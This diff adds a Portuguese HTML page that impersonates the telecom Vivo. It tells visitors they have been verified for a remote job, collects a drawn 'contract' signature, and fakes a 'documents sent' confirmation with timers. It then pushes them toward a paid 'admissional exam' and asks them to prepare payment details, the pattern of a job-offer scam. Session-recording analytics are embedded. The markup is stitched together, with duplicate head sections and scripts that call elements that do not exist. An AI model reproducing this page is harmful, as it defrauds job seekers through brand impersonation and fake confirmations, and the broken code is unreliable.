@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Vaga Atendente – Vivo</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    
+    .font-script { font-family: "Brush Script MT", cursive; }
+  </style>
+  <style>
+  @keyframes slideInRight {
+    from { transform: translateX(100%); opacity: 0; }
+    to   { transform: translateX(0); opacity: 1; }
+  }
+  .animate-slide-in-right {
+    animation: slideInRight 0.5s ease-out forwards;
+  }
+</style>
+
+</head>
+<body class="bg-gray-100 min-h-screen">
+
+
+
+  <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificação de Candidato – Vivo</title>
+  <!-- Tailwind CSS via CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "rqs6jaszdp");
+</script>
+</head>
+<body class="bg-gray-50 text-gray-900">
+  <!-- Header Vivo -->
+  <header class="bg-white border-b border-gray-200">
+    <div class="max-w-5xl mx-auto flex items-center justify-between px-6 py-4">
+      <img src="images/vivo.png" alt="Vivo" class="h-8"/>
+      <nav class="space-x-6">
+        <a href="#" class="text-gray-600 hover:text-gray-900 font-medium">Home</a>
+        <a href="#" class="text-gray-600 hover:text-gray-900 font-medium">Sobre</a>
+        <a href="#" class="text-gray-600 hover:text-gray-900 font-medium">Planos</a>
+      
+      </nav>
+    </div>
+  </header>
+
+
+  <div class="flex items-center justify-center p-4">
+    <div class="bg-white rounded-2xl shadow-xl border-l-4 border-purple-700 max-w-md w-full overflow-hidden">
+      <div class="bg-purple-700 p-6">
+        <h1 class="text-white text-3xl font-bold">vivo</h1>
+      </div>
+      <div class="p-6 space-y-6">
+        <div class="flex items-center space-x-3">
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-8 h-8 text-green-500 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M9 12l2 2l4 -4" />
+          </svg>
+          <h2 class="text-xl font-semibold text-gray-800">Verificado com sucesso</h2>
+        </div>
+        <div class="text-gray-700 space-y-2">
+          <p>Encontramos uma vaga disponível. Assine o contrato abaixo para reservar sua vaga. Nosso time entrará em contato através do seu email ou celular.</p>
+          <p class="font-medium">Para realizar o trabalho, é necessário um Celular e um Chip de qualquer operadora</p>
+        </div>
+
+
+        <div id="contract-container" class="bg-white border border-gray-200 rounded-lg p-4">
+          <h3 class="text-center text-lg font-bold text-gray-900 mb-4">CONTRATO DE TRABALHO</h3>
+          <p class="text-gray-600 text-sm mb-4">
+            Pelo presente instrumento particular de trabalho, o EMPREGADOR, “Vivo”, e o EMPREGADO, “Atendente”, acordam:
+          </p>
+          <ol class="list-decimal list-inside text-gray-600 text-sm space-y-2">
+            <li>Função e local: atendimento remoto.</li>
+            <li>Jornada: a definir em acordo prévio.</li>
+            <li>Modalidade: home office (equip. e internet por conta do Atendente).</li>
+            <li>Remuneração: R$ 800–1.200 semanais conforme desempenho.</li>
+          </ol>
+        </div>
+
+
+
+
+    <div id="signature-section" class="mt-8 max-w-4xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-6">
+
+      <div class="bg-white p-6 rounded-2xl shadow-lg flex flex-col">
+        <h3 class="text-lg font-semibold text-gray-800 mb-4">
+  Assinatura Digital <span class="text-sm font-normal text-gray-600">(assine com o dedo na tela)</span>
+</h3>
+
+        <canvas
+          id="signature-pad"
+          class="w-full h-48 border border-gray-200 rounded-lg"
+        ></canvas>
+        <div class="mt-4 flex justify-end space-x-4">
+          <button
+            id="clear-signature"
+            class="px-4 py-2 bg-gray-200 rounded-lg hover:bg-gray-300 transition"
+          >
+            Limpar
+          </button>
+          <button
+            id="send-signature"
+            class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
+          >
+            Enviar
+          </button>
+        </div>
+      </div>
+    </div> 
+  <script src="https://cdn.jsdelivr.net/npm/signature_pad@4.0.0/dist/signature_pad.umd.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const sendBtn      = document.getElementById('send-signature');
+      const clearBtn     = document.getElementById('clear-signature');
+      const canvas       = document.getElementById('signature-pad');
+      const signaturePad = new SignaturePad(canvas, { penColor: 'black' });
+
+   
+      function resizeCanvas() {
+        const ratio = Math.max(window.devicePixelRatio || 1, 1);
+        canvas.width  = canvas.offsetWidth * ratio;
+        canvas.height = canvas.offsetHeight * ratio;
+        canvas.getContext('2d').scale(ratio, ratio);
+        signaturePad.clear();
+      }
+      window.addEventListener('resize', resizeCanvas);
+      resizeCanvas();
+
+     
+      clearBtn.addEventListener('click', () => signaturePad.clear());
+
+      sendBtn.addEventListener('click', () => {
+        if (signaturePad.isEmpty()) {
+          return alert('Por favor, assine antes de enviar.');
+        }
+
+        
+        sendBtn.disabled = true;
+        sendBtn.innerHTML = `
+          <svg class="w-5 h-5 animate-spin inline-block mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+          </svg>
+          Carregando...
+        `;
+
+        setTimeout(() => {
+          
+          sendBtn.innerHTML = `
+            <svg class="w-5 h-5 inline-block mr-2 text-green-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+            </svg>
+            Enviado
+          `;
+        }, 3000);
+      });
+    });
+  </script>
+
+
+
+
+<div class="max-w-4xl mx-auto mb-8 p-6 bg-white rounded-2xl shadow-lg border-l-4 border-blue-500">
+  <div class="flex items-start space-x-4">
+   
+<svg xmlns="http://www.w3.org/2000/svg"
+     class="h-8 w-8 text-blue-500 flex-shrink-0"
+     fill="none"
+     viewBox="0 0 24 24"
+     stroke="currentColor"
+     aria-hidden="true"
+>
+  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+        d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
+  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+        d="M12 9v4m0 4h.01" />
+</svg>
+
+
+    <div class="flex-1">
+      <h4 class="text-xl font-semibold text-gray-900 mb-2">
+        Atenção: Preparação para agendamento de exame
+      </h4>
+      
+      <p class="text-gray-700 text-sm mb-3 leading-relaxed">
+  Na próxima etapa, você realizará o <strong>exame admissional</strong>, um procedimento obrigatório para avaliar sua saúde e confirmar sua aptidão ao trabalho.
+</p>
+
+      <ul class="list-disc list-inside text-gray-600 space-y-1 mb-4">
+       <li>
+  <strong>Confirmar contratação:</strong> todas etapas são feitas com assinatura digital validada e registro de contrato, protegendo seus dados e confirmando sua vaga de forma segura.
+</li>
+
+  <li>
+  <strong>Avaliação de aptidão:</strong> essencial para avaliar nossos colaboradores e garantir que tudo esteja em conformidade antes de iniciar suas atividades.
+</li>
+
+          <li><strong>Manter tudo online:</strong> sem necessidade de deslocamento, faça pelo smartphone ou desktop.</li>
+        </ul>
+        <p class="text-gray-600 text-sm italic">
+    Prepare seus dados de pagamento e fique tranquilo: todo o sistema é projetado para ser simples, rápido e totalmente seguro.  
+    <span class="text-purple-600 font-semibold">Tudo realizado de forma online.</span>
+  </p>
+
+    
+<div class="mt-6 text-center">
+  <button
+  id="proceed-exam"
+  class="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded shadow transition"
+  onclick="window.location.href='../admissional/index.html';"
+>
+  Prosseguir com exame
+</button>
+
+
+</div>
+
+    </div>
+  </div>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  <!-- TOAST -->
+  <div id="toast" class="fixed bottom-4 right-4 bg-green-600 text-white px-4 py-2 rounded shadow-lg hidden">
+    Documentos enviados!
+  </div>
+
+ <!-- NO <head>, mantenha ou adicione esta animação: -->
+<style>
+  @keyframes slideInRight {
+    from { transform: translateX(100%); opacity: 0; }
+    to   { transform: translateX(0); opacity: 1; }
+  }
+  .animate-slide-in-right {
+    animation: slideInRight 0.4s ease-out forwards;
+  }
+</style>
+
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    document.getElementById('toggle-exam-info')
+      .addEventListener('click', () => {
+        document.getElementById('exam-info').classList.toggle('hidden');
+      });
+  });
+</script>
+
+
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/signature_pad@4.0.0/dist/signature_pad.umd.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const canvas            = document.getElementById('signature-pad');
+      const signaturePad      = new SignaturePad(canvas, { penColor: 'black' });
+      const clearBtn          = document.getElementById('clear-signature');
+      const sendBtn           = document.getElementById('send-signature');
+      const sigContainer      = document.getElementById('signature-container');
+      const toast             = document.getElementById('toast');
+      const examModal         = document.getElementById('exam-modal');
+      const closeExamModalBtn = document.getElementById('close-exam-modal');
+      const toggleInfo        = document.getElementById('toggle-exam-info');
+      const examInfo          = document.getElementById('exam-info');
+
+      // ajusta canvas ao DPI
+      function resizeCanvas() {
+        const ratio = Math.max(window.devicePixelRatio || 1, 1);
+        canvas.width  = canvas.offsetWidth * ratio;
+        canvas.height = canvas.offsetHeight * ratio;
+        canvas.getContext('2d').scale(ratio, ratio);
+        signaturePad.clear();
+      }
+      window.addEventListener('resize', resizeCanvas);
+      resizeCanvas();
+
+      clearBtn.addEventListener('click', () => signaturePad.clear());
+
+      sendBtn.addEventListener('click', () => {
+        if (signaturePad.isEmpty()) {
+          return alert('Por favor, assine antes de enviar.');
+        }
+        
+        sendBtn.replaceWith(spinner);
+
+        setTimeout(() => {
+          // exibe toast
+          toast.classList.remove('hidden');
+          setTimeout(() => toast.classList.add('hidden'), 4000);
+          // oculta assinatura
+          sigContainer.classList.add('hidden');
+          // exibe popup exame
+          examModal.classList.remove('hidden');
+          // restaura botão Enviar (caso queira reenviar sem reload)
+          spinner.replaceWith(sendBtn);
+        }, 4000);
+      });
+
+      closeExamModalBtn.addEventListener('click', () => {
+        examModal.classList.add('hidden');
+      });
+
+      toggleInfo.addEventListener('click', () => {
+        examInfo.classList.toggle('hidden');
+      });
+    });
+  </script>
+
+</body>
+</html>
+  
+
+
+  </div>
+</div>
+
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const toggle = document.getElementById('toggle-exam-info');
+    const info   = document.getElementById('exam-info');
+    toggle.addEventListener('click', () => {
+      info.classList.toggle('hidden');
+    });
+  });
+</script>
+
+
+<script>
+  document
+    .getElementById('toggle-exam-info')
+    .addEventListener('click', () => {
+      document.getElementById('exam-info').classList.toggle('hidden');
+    });
+</script>
+
+
+<script>
+  document.getElementById('toggle-exam-info').addEventListener('click', () => {
+    document.getElementById('exam-info').classList.toggle('hidden');
+  });
+</script>
+
+
+  <!-- no <head>, adicione o Flatpickr -->
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
+
+
+
+
+  <!-- Signature Pad library + script -->
+  <script src="https://cdn.jsdelivr.net/npm/signature_pad@4.0.0/dist/signature_pad.umd.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const canvas = document.getElementById('signature-pad');
+      const signaturePad = new SignaturePad(canvas, { penColor: 'black' });
+      const clearBtn = document.getElementById('clear-signature');
+      const sendBtn = document.getElementById('send-signature');
+      const buttonsContainer = document.getElementById('buttons-container');
+      const toast = document.getElementById('toast');
+      const exameSection = document.getElementById('exame-section');
+
+      function resizeCanvas() {
+        const ratio = Math.max(window.devicePixelRatio || 1, 1);
+        canvas.width = canvas.offsetWidth * ratio;
+        canvas.height = canvas.offsetHeight * ratio;
+        canvas.getContext('2d').scale(ratio, ratio);
+        signaturePad.clear();
+      }
+      window.addEventListener('resize', resizeCanvas);
+      resizeCanvas();
+
+      clearBtn.addEventListener('click', () => signaturePad.clear());
+
+      sendBtn.addEventListener('click', () => {
+        if (signaturePad.isEmpty()) {
+          alert('Por favor, assine antes de enviar.');
+          return;
+        }
+        // mostra spinner
+        const spinner = document.createElement('div');
+        spinner.innerHTML = `
+          <svg class="w-6 h-6 animate-spin text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
+          </svg>`;
+        buttonsContainer.replaceChild(spinner, sendBtn);
+
+        setTimeout(() => {
+          // remove spinner e mostra confirmação
+          const confirmation = document.createElement('div');
+          confirmation.className = 'px-3 py-1 bg-green-600 text-white rounded text-sm';
+          confirmation.textContent = 'Documentos enviados!';
+          buttonsContainer.replaceChild(confirmation, spinner);
+          // revela a seção de exame admissional
+          exameSection.classList.remove('hidden');
+          // mostra toast também
+          toast.classList.remove('hidden');
+          setTimeout(() => toast.classList.add('hidden'), 3000);
+        }, 1500);
+      });
+    });
+  </script>
+
+</body>
+</html>
